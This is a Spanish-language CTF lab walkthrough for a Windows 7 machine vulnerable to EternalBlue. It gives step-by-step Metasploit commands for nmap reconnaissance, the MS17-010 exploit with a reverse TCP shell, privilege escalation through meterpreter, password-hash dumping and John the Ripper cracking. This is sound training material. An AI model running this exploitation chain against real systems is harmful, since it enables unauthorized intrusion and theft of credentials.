---
icon: arrow-turn-down-right
---

# Blue

## Introducción

Esta máquina es un Windows 7 vulnerable a EternalBlue. Iremos avanzando por la máquina, con las preguntas que nos plantean nos servirán de guía.

## Task 1: Recon

Nos harán dos preguntas a las que podremos dar respuesta con los resultados de un escaneo con Nmap:

```bash
nmap -sV -sC -Pn <IP>
```

**-sC**: Ejecución de scripts predeterminados, estos nos permiten identificar vulnerabilidades a las que puede ser vulnerable el servicio u obtener información adicional.

**-sV:** Identifica la versión del servicio que se está ejecutando en el puerto, y por tanto, podemos saber si ese servicio es vulnerable a alguna vulnerabilidad conocida.

-Pn: Desactiva el realizar un ping para descubrir el host.

## Task 2: Gain Access

En esta task se nos harán 3 preguntas, para responderlas, utilizaremos Metasploit para explotar la vulnerabilidad que me hemos descubierto en la tarea de recon:

{% code overflow="wrap" %}
```bash
sudo msfconsole -q

msf6 > search eternalblue

msf6 > use 0

msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS <IP>

msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```
{% endcode %}

## Task 3: Escalate

Pondremos en background la shell obtenida como nos indican al principio de esta task

\[Ctrl+Z]

Para responder las preguntas de este apartado, usaremos un módulo de post explotación disponible en Metasploit para convertir la shell obtenida en una shell de meterpreter:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

msf6 post(multi/manage/shell_to_meterpreter) > show options

msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1

msf6 post(multi/manage/shell_to_meterpreter) > run

msf6 post(multi/manage/shell_to_meterpreter) > sessions

msf6 post(multi/manage/shell_to_meterpreter) > sessions 2

meterpreter > getsystem

meterpreter > ps

meterpreter > migrate <PID proceso>
```

## Task 4: Cracking

Se nos indicará que comando usar para responder a una de las preguntas:

```bash
meterpreter > hashdump
```

Este comando en meterpreter hará un dumpeo de los hashes de las contraseñas de cada usuario del sistema.

También existe un módulo para Metasploit para ello:

```bash
meterpreter > background

msf6 post(multi/manage/shell_to_meterpreter) > use post/windows/gather/hashdump

msf6 post(windows/gather/hashdump) > options

msf6 post(windows/gather/hashdump) > set SESSION 2

msf6 post(windows/gather/hashdump) > run

msf6 post(windows/gather/hashdump) > creds
```

Para crackear estos hashes, podremos hacerlo con john directamente:

{% code overflow="wrap" fullWidth="false" %}
```bash
john --wordlist=<archivo de diccionario> --format=<formato de los hashes> <archivo txt con los hashes>
```
{% endcode %}

En Metasploit también tenemos un módulo para ello:

{% code overflow="wrap" %}
```bash
msf6 post(windows/gather/hashdump) > use auxiliary/analyze/jtr_windows_fast

msf6 auxiliary(analyze/jtr_windows_fast) > options

msf6 auxiliary(analyze/jtr_windows_fast) > set CUSTOM_WORDLIST <archivo de diccionario>

msf6 auxiliary(analyze/jtr_windows_fast) > run
```
{% endcode %}

## Task 5: Find Flags!

En este apartado debemos introducir las diferentes flags que se pueden encontrar en el sistema que ya hemos vulnerado, para ellos nos moveremos por los directorios del sistema:

```bash
// Abrir la sesión con la shell en el sistema víctima
msf6 post(multi/manage/shell_to_meterpreter) > sessions 1

// Moverse a un directorio
C:\Windows\system32>cd <directorio>

// Listar contenido de un directorio
C:\>dir

// Mostrar contenido del archivo
C:\>type <archivo.txt>
```

Con estos comandos básicos para moverse en el sistema y conociendo la estructura de carpetas de Windows conseguirás las flags y habrás completado el laboratorio :thumbsup:
